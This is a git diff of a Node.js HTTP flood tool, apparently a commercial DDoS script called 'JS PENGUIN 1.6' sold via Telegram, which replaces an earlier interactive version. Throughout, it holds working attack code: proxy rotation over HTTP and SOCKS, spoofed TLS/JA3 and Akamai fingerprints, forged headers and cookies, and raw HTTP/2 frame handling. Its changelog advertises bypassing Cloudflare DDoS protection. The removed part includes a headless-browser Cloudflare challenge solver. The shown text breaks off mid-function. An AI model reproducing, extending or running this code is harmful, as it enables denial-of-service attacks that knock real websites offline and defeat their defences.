@@ -1,544 +1,1407 @@
 /*
-    PENGUIN INTERACTIVE 2.0 (FIXED - WORKING)
-    Installation: npm install hpack socks colors commander puppeteer-extra puppeteer-extra-plugin-stealth readline
-    Run: node penguin.js
+    JS PENGUIN 1.6
+
+    Node: v22.9.0
+    OS: Ubuntu 22.08
+    安装: npm install hpack https commander colors
+
+    ATLAS corporation (t.me/atlasapi)
+    开发者: Benshii (t.me/benshii)
+    日期: 2025年1月16日
+
+    ———————————————————————————————————————————
+
+    由ATLAS API公司发布 (atlasapi.co)
+
+    感谢您购买此脚本。
+
+    1.1 更新日志:
+    - 添加重定向处理器
+    - 添加cookie解析器
+    - 修复更新头信息
+    - 添加代理连接统计
+    - 移除UAM选项
+    
+    1.2 更新日志:
+    - 添加配置加载功能
+
+    1.3 更新日志:
+    - 修复随机路径
+    - 支持Socks4/5
+    - 优化代码
+    - 更新随机速率
+
+    1.4 更新日志:
+    - 更快的请求速度
+    - 新的代理类
+    - 额外的头信息
+    - 新的速率限制处理器
+    - 随机TLS设置
+    - 改进的指纹
+    - HTTP2请求队列
+    
+    1.5 更新日志:
+    - 绕过Cloudflare HTTPD0S
+    - 支持HTTP, HTTP/1.1和HTTP/2
+    - 支持代理身份验证
+    - 与浏览器脚本兼容
+    - 可选的TLS Chrome指纹
+    - 高级随机速率系统选项
+    - 可选随机路径/速率限制模式
+    - 支持socks4/5和http/s代理
+    - 更新的随机cookie系统
+    
+    1.6 更新日志:
+    - 新的HTTPDD0S绕过功能
+    - 伪造Akamai指纹
+    - 修复JA3 TLS指纹
+    - 更新速率限制处理器
+    - 添加新的cookie模式
+    - 更新速率限制处理器
+    - 新的缓存绕过选项
+    - 更新指纹选项
+    - 新的和更新的头信息
+    - 更新随机路径选项
+    - 自动检测代理协议
+    - 调试数据帧选项
+    - 更新快速重置选项
+    - 更新密码和签名算法
+    - 自适应http2设置
+    - 从API获取代理
+
+    即将推出
 */
 
 const net = require('net');
 const tls = require('tls');
-const http2 = require('http2');
+const HPACK = require('hpack');
 const cluster = require('cluster');
 const fs = require('fs');
 const os = require('os');
 const crypto = require('crypto');
 const colors = require('colors');
-const { SocksClient } = require('socks');
-const puppeteer = require('puppeteer-extra');
-const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-puppeteer.use(StealthPlugin());
-const readline = require('readline');
+const { Command } = require('commander');
+const socks = require('socks').SocksClient;
+// console.log(headerGenerator.getHeaders())
 
-// ----------------------------------------------
-//  CONFIG (will be overwritten in worker)
-// ----------------------------------------------
-let CONFIG = {
-    target: '',
-    time: 120,
-    threads: 4,
-    rate: 100,
-    proxyFile: 'proxy.txt',
-    proxyType: 'http',
-    cookieMode: 'RAND',
-    extra: false,
-    randpath: false,
-    query: false,
-    ratelimit: false,
-    debug: true,
-    delay: 5
-};
+process.setMaxListeners(0);
 
-// ----------------------------------------------
-//  HELPER FUNCTIONS
-// ----------------------------------------------
-function randStr(len) {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    let s = '';
-    for (let i=0; i<len; i++) s += chars[Math.floor(Math.random()*chars.length)];
-    return s;
-}
-function randNum(min,max) { return Math.floor(Math.random()*(max-min+1))+min; }
-function randElem(arr) { return arr[Math.floor(Math.random()*arr.length)]; }
-function randIP() { return randNum(1,255) + '.' + randNum(1,255) + '.' + randNum(1,255) + '.' + randNum(1,255); }
-function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }
-
-// ----------------------------------------------
-//  KEYBOARD INPUT
-// ----------------------------------------------
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
+process.on('uncaughtException', function (e) {
+    // console.log(e)
+});
+process.on('unhandledRejection', function (e) {
+    // console.log(e)
 });
 
-function askQuestion(query) {
-    return new Promise(resolve => {
-        rl.question(query, answer => resolve(answer));
-    });
-}
+const options = new Command();
+options
+    .option('-m, --method <method>', '请求方法 <GET/POST/...>')
+    .option('-u, --target <url>', '目标URL <http/https>')
+    .option('-s, --time <seconds>', '攻击持续时间 <秒>', 120) 
+    .option('-t, --threads <number>', '线程数量 <整数>', 4)
+    .option('-r, --rate <rate>', '每秒请求数 <整数>', 60)
 
-async function getConfig() {
-    console.clear();
-    console.log(colors.green.bold('PENGUIN INTERACTIVE 2.0'));
-    console.log('Enter attack parameters (press Enter for default):\n');
+    .option('-p, --proxy <proxy>', '代理文件 <路径>')
+    .option('-T, --type <proxytype>', '代理类型 <http/socks4/socks5>', 'http')
+    .option('-d, --debug <debug>', '调试模式 <true/false>', true)
 
-    CONFIG.target = await askQuestion('Target URL (https://example.com): ') || 'https://example.com';
-    CONFIG.time = parseInt(await askQuestion('Attack duration (seconds) [120]: ') || 120);
-    CONFIG.threads = parseInt(await askQuestion('Number of threads [4]: ') || 4);
-    CONFIG.rate = parseInt(await askQuestion('Requests/sec per thread [100]: ') || 100);
-    CONFIG.proxyFile = await askQuestion('Proxy file [proxy.txt]: ') || 'proxy.txt';
-    CONFIG.proxyType = await askQuestion('Proxy type (http/socks4/socks5) [http]: ') || 'http';
-    CONFIG.cookieMode = await askQuestion('Cookie mode (CLOUDFLARE/AKAMAI/STORMWALL/VERCEL/RAND) [RAND]: ') || 'RAND';
-    const extra = await askQuestion('Enable extra headers? (y/n) [n]: ');
-    CONFIG.extra = extra.toLowerCase() === 'y';
-    const rpath = await askQuestion('Enable random path? (y/n) [n]: ');
-    CONFIG.randpath = rpath.toLowerCase() === 'y';
-    const qry = await askQuestion('Enable random query params? (y/n) [n]: ');
-    CONFIG.query = qry.toLowerCase() === 'y';
-    const rl_opt = await askQuestion('Handle rate limit (429)? (y/n) [n]: ');
-    CONFIG.ratelimit = rl_opt.toLowerCase() === 'y';
-    CONFIG.debug = true;
+    .option('-v, --http <version>', 'http版本 <1/2>', 2)
+    .option('--full <full>', '完整头信息 <true/false>', false)
+    .option('--extra <extra>', '额外头信息 <true/false>', false)
+    .option('--delay <delay>', '请求间延迟 <毫秒>', 10)
+    .option('-D, --data <data>', '请求数据 <字符串/RAND>')
+    .option('--cache', '绕过缓存 <true/false>', false)
+    .option('--close <close>', '关闭坏代理 <true/false>', false)
+    .option('--conns <conns>', '连接限制 <1/10000>')
 
-    rl.close();
-    console.log('\nSettings accepted. Starting attack...\n');
-    return CONFIG;
-}
+    .option('-q, --query <query>', '生成随机查询 <true/false>', false)
+    .option('--randrate <randrate>', '随机请求速率 <1-128/60-90>', "")
+    .option('--randpath <randpath>', '随机URL路径 <true/false>', false)
+    .option('--ratelimit <ratelimit>', '速率限制模式 <true/false>', false)
 
-// ----------------------------------------------
-//  ATTACK ENGINE (shared)
-// ----------------------------------------------
-let proxyPool = [];
-let proxyBlacklist = new Set();
-const MAX_CONCURRENT_STREAMS = 10000;
-const MAX_HEADER_LIST_SIZE = 262144;
-const INITIAL_WINDOW_SIZE = 6291456;
-const MAX_FRAME_SIZE = 16384;
-const KEEP_ALIVE_MS = 120000;
-const PROXY_POOL_SIZE = 2000;
-const PROXY_REFRESH_INTERVAL = 30000;
-const JA3_ROTATE_INTERVAL = 30000;
-const SESSION_LIFETIME = 45000;
-const MAX_RAM_PCT = 92;
+    .option('-I, --ip <ip:port>', 'IP地址 <ipv4>')
+    .option('-U, --ua <agent>', '用户代理头信息 <字符串>')
+    .option('-C, --cookie <cookie>', 'Cookie <字符串/RAND>')
 
-function loadProxies() {
-    try {
-        const raw = fs.readFileSync(CONFIG.proxyFile, 'utf8').split(/\r?\n/).filter(l=>l.trim());
-        const shuffled = raw.sort(()=>Math.random()-0.5);
-        proxyPool = shuffled.slice(0, PROXY_POOL_SIZE);
-        console.log('[Pool] Loaded ' + proxyPool.length + ' proxies');
-    } catch(e) {
-        console.error('Error loading proxies:', e.message);
-        process.exit(1);
-    }
-}
+    .option('-F, --fingerprint <fp>', 'TLS指纹 <true/false>', false)
+    .option('-R, --referer <referer>', '引用URL <url/RAND>')
 
-function getLiveProxy() {
-    for (let i=0; i<proxyPool.length*2; i++) {
-        const p = proxyPool[randNum(0, proxyPool.length-1)];
-        if (!proxyBlacklist.has(p)) return p;
-    }
-    return proxyPool[0] || null;
-}
+    .option('--checker <checker>', '代理检查器', false)
 
-// JA3 generator (but not used in tls options, kept for future)
-function randomJA3() {
-    const sslVersions = ['771','772','773'];
-    const ciphers = ['4865','4866','4867','49195','49196','49200','52393','52392','49171','49172','156','157','47','53'];
-    const extensions = ['45','35','18','0','5','17513','27','10','11','43','13','16','65281','65037','51','23','41'];
-    const curves = ['4588','29','23','24'];
-    const ja3 = randElem(sslVersions) + ',' + randElem(ciphers) + ',' + randElem(extensions) + ',' + randElem(curves);
-    return crypto.createHash('md5').update(ja3).digest('hex');
-}
-let currentJA3 = randomJA3();
-setInterval(() => { currentJA3 = randomJA3(); }, JA3_ROTATE_INTERVAL);
+    .option('--config <file>', '加载配置 <文件.json>')
 
-// Cloudflare solver
-const cfCache = new Map();
-async function solveCF(proxyAddr) {
-    const now = Date.now();
-    if (cfCache.has(proxyAddr)) {
-        const entry = cfCache.get(proxyAddr);
-        if (now - entry.timestamp < 600000) return entry.cookie;
-    }
-    let browser;
-    try {
-        browser = await puppeteer.launch({
-            headless: true,
-            args: ['--proxy-server=http://' + proxyAddr, '--no-sandbox', '--disable-setuid-sandbox'],
-            ignoreHTTPSErrors: true
-        });
-        const page = await browser.newPage();
-        const uaList = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36'
-        ];
-        await page.setUserAgent(randElem(uaList));
-        await page.goto(CONFIG.target, { waitUntil: 'domcontentloaded', timeout: 30000 });
-        const title = await page.title();
-        if (title === 'Just a moment...' || title.includes('Cloudflare')) {
-            try {
-                await page.waitForSelector('input[type="checkbox"]', { timeout: 10000 });
-                await page.click('input[type="checkbox"]');
-                await page.waitForNavigation({ timeout: 30000 });
-            } catch(e) {}
+    .parse(process.argv);
+
+    if (options.opts().config && typeof options.opts().config === 'string') {
+        try {
+            const config_options = fs.readFileSync(options.config, 'utf8');
+            const config = JSON.parse(config_options);
+            Object.keys(config).forEach(key => {
+                if (options[key] !== null && config[key] !== null && config[key] !== false && config[key] !== options.opts()[config[key]]) {
+                    options[key] = config[key];
+                }
+            });
+        } catch (error) {
+            console.error(`Error loading config: ${error.message}`);
+            process.exit(0)
         }
-        const cookies = await page.cookies(CONFIG.target);
-        const cf = cookies.find(c=>c.name==='cf_clearance');
-        const cookieStr = cf ? cf.name + '=' + cf.value : '';
-        cfCache.set(proxyAddr, {cookie: cookieStr, timestamp: now});
-        await browser.close();
-        return cookieStr;
-    } catch(e) {
-        if (browser) await browser.close();
-        return '';
+    }
+
+
+    
+const opts = options.opts();
+
+require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
+
+if (!options.opts().method || !options.opts().target || !options.opts().proxy) {
+    options.help();
+    process.exit(1);
+}
+
+// const opts = options.opts();
+var reqmethod = opts.method || "GET";
+const target = opts.target;
+const time = opts.time || 120;
+const threads = opts.threads;
+const ratelimit = opts.rate || 60;
+const proxyfile = opts.proxy;
+const proxytype = opts.type;
+const debug = opts.debug || false;
+
+const http_opt = parseInt(opts.http) || 2;
+const full_headers = opts.full || false;
+const extra_headers = opts.extra || false;
+const delay_opt = opts.delay || 10;
+const data_opt = opts.data || undefined;
+const cache_opt = opts.cache;
+const close_opt = opts.close;
+
+const query_opt = opts.query || false;
+const randrate = opts.randrate;
+const randpath = opts.randpath || false;
+const ratelimit_opt = opts.ratelimit;
+
+const fingerprint_opt = opts.fingerprint || true;
+const referer_opt = opts.referer || false;
+
+const ip_opt = opts.ip || undefined;
+const ua_opt = opts.ua || undefined;
+const checker = opts.checker || false;
+const connections = opts.conns;
+var cookie_opt = opts.cookie || undefined;
+
+// const uam_opt = opts.uam || false;
+
+const status_queue = []
+let status_codes = {}
+
+const url = new URL(target);
+const protocol = url.protocol.replace(":", "");
+const port = url.port || (url.protocol === 'https:' ? 443 : 80);
+
+const request_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'RAND']
+
+const SettingHeaderTableSize = 0x1;
+const SettingEnablePush = 0x2;
+const SettingInitialWindowSize = 0x4;
+const SettingMaxHeaderListSize = 0x6;
+
+if (!proxyfile) {
+    console.error("Proxy file is missing!");
+    process.exit(1);
+}
+
+const proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
+
+if (!request_methods.includes(reqmethod)) {
+    console.error('Invalid request method!');
+    process.exit(1);
+}
+
+if (!['http', 'https', 'socks4', 'socks5'].includes(proxytype)) {
+    console.error('Invalid proxytype! (http/socks4/socks5)');
+    process.exit(1);
+}
+
+function random_string(length) {
+    const characters = 'abcdefghijklmnopqrstuvwxyz';
+    let result = "";
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return result;
+}
+
+
+function random_int(minimum, maximum) {
+    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
+}
+
+function random_cookies() {
+    let cookies = "";
+    const cookie_names = ["JSESSIONID", "_ga", "PHPSESSID", `_ga_${random_string(random_int(10, 11)).toUpperCase()}`];
+        
+    const cookie_limit = random_int(1, cookie_names.length);
+    for (var x = 0; x < cookie_limit; x++) {
+        const cookie_name = cookie_names[Math.floor(Math.random() * cookie_names.length)];
+        const cookie_index = cookie_names.indexOf(cookie_name);
+        if (cookie_index > -1) {
+            cookie_names.splice(cookie_index, 1);
+        }
+        const cookie_value = random_string(random_int(random_int(16, 32), random_int(32, 64)));
+        cookies += `${cookie_name}=${cookie_value}`;
+        if (x+1 < cookie_limit) {
+            cookies += '; ';
+        }
     }
 }
 
-// Cookie generator
-function generateCookie(mode) {
-    switch(mode?.toUpperCase()) {
-        case 'CLOUDFLARE': return 'cf_clearance=' + randStr(32);
-        case 'AKAMAI': return 'ak_bmsc=' + randStr(64);
-        case 'STORMWALL': return 'sw_session=' + randStr(64);
-        case 'VERCEL': return '_vcrcs=' + randNum(1e9,3e9) + '.' + randNum(3600,7200) + '.' + randStr(20) + '.' + randStr(32) + '.' + randStr(10);
-        default: return randStr(48);
-    }
+function random_ip() {
+    return `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`;
 }
 
-// ProxyConnector class
-class ProxyConnector {
-    constructor(host, port, type, username='', password='') {
-        this.host = host;
-        this.port = parseInt(port);
-        this.type = type.toUpperCase();
-        this.username = username;
-        this.password = password;
-        this.socket = null;
-        this.tls = null;
-    }
+const ciphers = [
+    "TLS_GREASE",
+    "TLS_AES_128_GCM_SHA256",
+    "TLS_AES_256_GCM_SHA384",
+    "TLS_CHACHA20_POLY1305_SHA256",
+    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
+    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
+    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
+    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
+    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
+    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
+    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
+    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
+    "TLS_RSA_WITH_AES_128_GCM_SHA256",
+    "TLS_RSA_WITH_AES_256_GCM_SHA384",
+    "TLS_RSA_WITH_AES_128_CBC_SHA",
+    "TLS_RSA_WITH_AES_256_CBC_SHA"
+].join(":");
 
-    connect() {
+const curves = [
+    "X25519",
+    "P-256",
+    "P-384"
+].join(":");
+
+const sigalgs = [
+    "ecdsa_secp256r1_sha256",
+    "rsa_pss_rsae_sha256",
+    "rsa_pkcs1_sha256",
+    "ecdsa_secp384r1_sha384",
+    "rsa_pss_rsae_sha384",
+    "rsa_pkcs1_sha384",
+    "rsa_pss_rsae_sha512",
+    "rsa_pkcs1_sha512"
+].join(":");
+
+const versions = [
+    "TLSv1.3",
+    "TLSv1.2"
+]
+
+const languages = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.9",
+];
+
+const encodings = [
+    "gzip, deflate, br, zstd",
+    "gzip, deflate, br"
+]
+
+const ssl_versions = ['771', '772', '773']; 
+const cipher_suites = ['4865', '4866', '4867', '49195', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
+const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];
+const elliptic_curves = ['4588', '29', '23', '24'];
+
+class Proxy {
+    constructor(host, port, type) {
+      this.host = host;
+      this.port = parseInt(port);
+      this.type = type;
+      this.socket = null;
+    }
+  
+    connect(options = {}) {
+      return new Promise((resolve, reject) => {
+        if (this.type === 'SOCKS4' || this.type === 'SOCKS5') {
+          this.socks(url.hostname, port, options)
+            .then(resolve)
+            .catch(reject);
+        } else if (this.type === 'HTTP' || this.type === 'HTTPS') {
+        this.http(options)
+          .then(resolve)
+          .catch(reject);
+        } else {
+          reject(new Error('Invalid proxy type'));
+        }
+      });
+    }
+  
+    socks(options) {
         return new Promise((resolve, reject) => {
-            const targetURL = new URL(CONFIG.target);
-            const targetHost = targetURL.hostname;
-            const targetPort = targetURL.port || 443;
-            if (this.type === 'HTTP' || this.type === 'HTTPS') {
-                const sock = net.connect({host: this.host, port: this.port});
-                sock.setTimeout(15000);
-                sock.on('connect', () => {
-                    let auth = '';
-                    if (this.username) {
-                        auth = 'Proxy-Authorization: Basic ' + Buffer.from(this.username + ':' + this.password).toString('base64') + '\r\n';
-                    }
-                    sock.write('CONNECT ' + targetHost + ':' + targetPort + ' HTTP/1.1\r\nHost: ' + targetHost + ':' + targetPort + '\r\n' + auth + '\r\n');
-                });
-                sock.on('data', (data) => {
-                    if (data.toString().includes('HTTP/1.1 200')) {
-                        this.socket = sock;
-                        resolve(sock);
-                    } else {
-                        sock.destroy();
-                        reject(new Error('Proxy refused'));
-                    }
-                });
-                sock.on('timeout', ()=> { sock.destroy(); reject(new Error('Timeout')); });
-                sock.on('error', (e)=> { sock.destroy(); reject(e); });
-            } else if (this.type === 'SOCKS4' || this.type === 'SOCKS5') {
-                SocksClient.createConnection({
-                    proxy: {
-                        host: this.host,
-                        port: this.port,
-                        type: this.type === 'SOCKS5' ? 5 : 4,
-                        userId: this.username,
-                        password: this.password
-                    },
-                    command: 'connect',
-                    destination: { host: targetHost, port: targetPort },
-                    timeout: 15000
-                }, (err, info) => {
-                    if (err) reject(err);
-                    else { this.socket = info.socket; resolve(info.socket); }
-                });
-            } else reject(new Error('Unsupported proxy type'));
+            socks.createConnection({
+                proxy: {
+                    host: this.host,
+                    port: this.port,
+                    type: this.type === 'SOCKS5' ? 5 : 4,
+                    ...(options.username && options.password && { userId: options.username, password: options.password }),
+                },
+                command: 'connect',
+                destination: { host: url.hostname, port: port },
+                timeout: options.timeout || 10000,
+            }, (error, info) => {
+                if (error) {
+                    return reject(new Error(`SOCKS connection error: ${error.message}`));
+                }
+                this.socket = info.socket;
+                resolve(info.socket);
+            });
+        });
+    }
+  
+    http(options) {
+        return new Promise((resolve, reject) => {
+            const socket = net.connect({host: this.host, port: this.port}, () => {
+                const request_header = `CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nConnection: Keep-Alive\r\n`;
+                const auth_header = options.username && options.password
+                    ? `Proxy-Authorization: Basic ${Buffer.from(`${options.username}:${options.password}`).toString('base64')}\r\n`
+                    : '';
+  
+                socket.write(`${request_header}${auth_header}\r\n`);
+            });
+  
+            socket.on('data', (data) => {
+            const response = data.toString('utf8');
+            if (response.includes('HTTP/1.1 200')) {
+                this.socket = socket;
+                resolve(socket);
+            } else {
+                socket.destroy();
+                reject(new Error(`Bad proxy response: ${response}`));
+            }
+            });
+    
+            socket.on('timeout', () => {
+                socket.destroy();
+                reject(new Error('Connection timeout'));
+            });
+    
+            socket.on('error', (err) => {
+                socket.destroy();
+                reject(new Error(`Connection error: ${err.message}`));
+            });
+    
+            socket.setTimeout(options.timeout || 10000);
+            socket.setKeepAlive(true, 60000);
+            socket.setMaxListeners(10 * 10 * 60);
         });
     }
 
     close() {
-        if (this.socket && !this.socket.destroyed) {
+        if (this.socket) {
+            // console.log(`socket: ${this.socket}, dead ? ${this.socket.destroyed}`);
             this.socket.destroy();
-            this.socket = null;
-        }
-        if (this.tls && !this.tls.destroyed) {
-            this.tls.destroy();
-            this.tls = null;
+            this.socket.removeAllListeners();
+            // console.log(`killed: socket: ${this.socket}, dead ? ${this.socket.destroyed}`);
         }
     }
 }
 
-// HTTP/2 session
-class H2Session {
-    constructor(proxyConnector, cookie) {
-        this.proxy = proxyConnector;
-        this.cookie = cookie;
-        this.client = null;
-        this.active = false;
-        this.rate = CONFIG.rate;
-        this.lastRateAdjust = Date.now();
+class Http2 {
+    constructor(proxy) {
+        this.id = 1;
+        this.data = Buffer.alloc(0);
+        this.hpack = new HPACK();
+        // this.hpack.setTableSize(4096);
+        this.frames = [];
+        this.proxy = proxy;
     }
 
-    async start() {
-        try {
-            const socket = await this.proxy.connect();
-            if (CONFIG.debug) console.log('[DEBUG] Connected to proxy:', this.proxy.host);
-            const targetURL = new URL(CONFIG.target);
-            const tlsOpts = {
-                socket: socket,
-                ALPNProtocols: ['h2'],
-                servername: targetURL.hostname,
-                rejectUnauthorized: false,
-                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256',
-                minVersion: 'TLSv1.3',
-                maxVersion: 'TLSv1.3'
-                // fingerprint removed because Node.js tls.connect does not support it
-            };
-            const tlsConn = tls.connect(443, targetURL.hostname, tlsOpts);
-            this.proxy.tls = tlsConn;
-            tlsConn.setKeepAlive(true, KEEP_ALIVE_MS);
-            tlsConn.setNoDelay(true);
+    static builder() {
+        return new Http2();
+    }
 
-            const client = http2.connect(CONFIG.target, {
-                settings: {
-                    headerTableSize: 65536,
-                    initialWindowSize: INITIAL_WINDOW_SIZE,
-                    maxHeaderListSize: MAX_HEADER_LIST_SIZE,
-                    enablePush: false,
-                    maxConcurrentStreams: MAX_CONCURRENT_STREAMS,
-                    maxFrameSize: MAX_FRAME_SIZE
-                },
-                createConnection: () => tlsConn
-            });
-            this.client = client;
-            this.active = true;
+    encode_frame(streamId, type, payload = "", flags = 0) {
+        this.id = streamId;
+        let frame = Buffer.alloc(9)
+        frame.writeUInt32BE(payload.length << 8 | type, 0)
+        frame.writeUInt8(flags, 4)
+        frame.writeUInt32BE(streamId, 5)
+        if (payload.length > 0)
+            frame = Buffer.concat([frame, payload])
+        return frame
+    }
 
-            client.on('connect', () => {
-                if (CONFIG.debug) console.log('[DEBUG] HTTP/2 session established on', this.proxy.host);
-                this._sendLoop();
-            });
-            client.on('error', (e) => {
-                if (CONFIG.debug) console.log('[DEBUG] HTTP/2 error on', this.proxy.host, ':', e.message);
-                this.active = false;
-                this.proxy.close();
-            });
-            client.on('close', () => {
-                if (CONFIG.debug) console.log('[DEBUG] HTTP/2 closed on', this.proxy.host);
-                this.active = false;
-                this.proxy.close();
-            });
-
-            setTimeout(() => { if (this.active) { this.client.close(); } }, SESSION_LIFETIME);
-        } catch(e) {
-            if (CONFIG.debug) console.log('[DEBUG] Failed to start session on', this.proxy.host, ':', e.message);
-            this.proxy.close();
-            throw e;
+    decode_frame(data) {
+        const length_type = data.readUInt32BE(0)
+        const length = length_type >> 8
+        const type = length_type & 0xFF
+        const flags = data.readUint8(4)
+        const streamID = data.readUInt32BE(5)
+        const offset = flags & 0x20 ? 5 : 0
+    
+        let payload = Buffer.alloc(0)
+    
+        if (length > 0) {
+            payload = data.subarray(9 + offset, 9 + offset + length)
+    
+            if (payload.length + offset != length) {
+                return null
+            }
+        }
+    
+        return {
+            streamID,
+            length,
+            type,
+            flags,
+            payload
         }
     }
 
-    _sendLoop() {
-        if (!this.active || !this.client) return;
-        const delayMs = 1000 / this.rate;
-
-        const sendOne = () => {
-            if (!this.active || this.client.destroyed) return;
-            const headers = this._buildHeaders();
-            const req = this.client.request(headers);
-            req.on('response', (resp) => {
-                const status = resp[':status'];
-                if (CONFIG.debug) console.log('[' + this.proxy.host + '] ' + status);
-                if (status === 429 && CONFIG.ratelimit) {
-                    this.rate = Math.max(1, this.rate * 0.7);
-                    this.cookie = generateCookie(CONFIG.cookieMode);
-                } else if (status >= 200 && status < 300) {
-                    this.rate = Math.min(2000, this.rate * 1.05);
-                }
-                // Send status to master
-                if (process.send) {
-                    process.send({ type: 'status', data: { [status]: 1 } });
-                }
-                req.close();
-            });
-            req.on('error', (e) => { if (CONFIG.debug) console.log('[REQ ERR]', e.message); req.close(); });
-            req.end();
-            setTimeout(sendOne, delayMs);
-        };
-        sendOne();
-    }
-
-    _buildHeaders() {
-        const target = new URL(CONFIG.target);
-        let path = target.pathname || '/';
-        if (CONFIG.randpath) {
-            path = path + '/' + randStr(randNum(6,12));
+    encode_settings(settings) {
+        const data = Buffer.alloc(6 * settings.length)
+        for (let i = 0; i < settings.length; i++) {
+            data.writeUInt16BE(settings[i][0], i * 6)
+            data.writeUInt32BE(settings[i][1], i * 6 + 2)
         }
-        let query = '';
-        if (CONFIG.query) {
-            query = '?' + randStr(randNum(8,20)) + '=' + randStr(randNum(4,10));
-        }
-        const method = 'GET';
-        const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + randNum(120,134) + '.0.0.0 Safari/537.36';
-        const lang = randElem(['en-US,en;q=0.9','ru-RU,ru;q=0.9','zh-CN,zh;q=0.8']);
-        const accept = randElem([
-            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-            'application/json,text/plain,*/*'
-        ]);
-        const secChUa = '"Not/A)Brand";v="8", "Chromium";v="' + randNum(120,134) + '", "Google Chrome";v="' + randNum(120,134) + '"';
-        const platform = randElem(['"Windows"','"Linux"','"macOS"']);
-
-        const h = {
-            ':method': method,
-            ':authority': target.hostname,
-            ':scheme': 'https',
-            ':path': path + query,
-            'user-agent': userAgent,
-            'accept': accept,
-            'accept-language': lang,
-            'accept-encoding': 'gzip, br',
-            'sec-ch-ua': secChUa,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': platform,
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'cache-control': 'no-cache',
-            'pragma': 'no-cache',
-            'x-forwarded-for': randIP(),
-            'cookie': this.cookie || generateCookie(CONFIG.cookieMode),
-        };
-        if (CONFIG.extra) {
-            h['x-requested-with'] = 'XMLHttpRequest';
-            h['x-real-ip'] = randIP();
-            h['x-client-data'] = randStr(randNum(20,40));
-        }
-        return h;
+        return data
     }
 }
 
-// ----------------------------------------------
-//  CLUSTER MASTER
-// ----------------------------------------------
-if (cluster.isMaster) {
-    (async () => {
-        const config = await getConfig();
-        // Launch workers
-        for (let i=0; i<config.threads; i++) {
-            cluster.fork({ config: JSON.stringify(config) });
+class Request {
+    constructor(path) {
+        this.path = path
+        this.headers = [];
+    }
+
+    static builder() {
+        return new Request();
+    }
+
+    set_path(path) {
+        this.path = path
+    }
+
+    add_header(header, value) {
+        const index = this.headers.findIndex(([key]) => key === header);
+        if (index !== -1) {
+            this.headers[index][1] = value;
+        } else {
+            this.headers.push([header, value]);
+        }
+        return this;
+    }
+
+    find_header(name) {
+        const header = this.headers.find(([k, _]) => k === name);
+        return header ? header[1] : null;
+    }
+
+    replace_header(k1, v1) {
+        const index = this.headers.findIndex(([k, _]) => k === k1);
+        if (index !== -1) {
+            this.headers[index][1] = v1;
+        }
+        return this;
+    }
+
+    add_headers(headers) {
+        for (const [key, value] of Object.entries(headers)) {
+            if (value !== null && value !== undefined) {
+                this.headers.push([key, value]);
+            }
+        }
+        return this;
+    }
+
+    generate_headers() {
+        this.headers = [];
+        const version = random_int(127, 131);
+        var brandValue, versionList, fullVersion;
+        switch (version) {
+            case 126:
+                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
+                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
+                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 127:
+                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
+                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
+                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 128:
+                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
+                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
+                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 129:
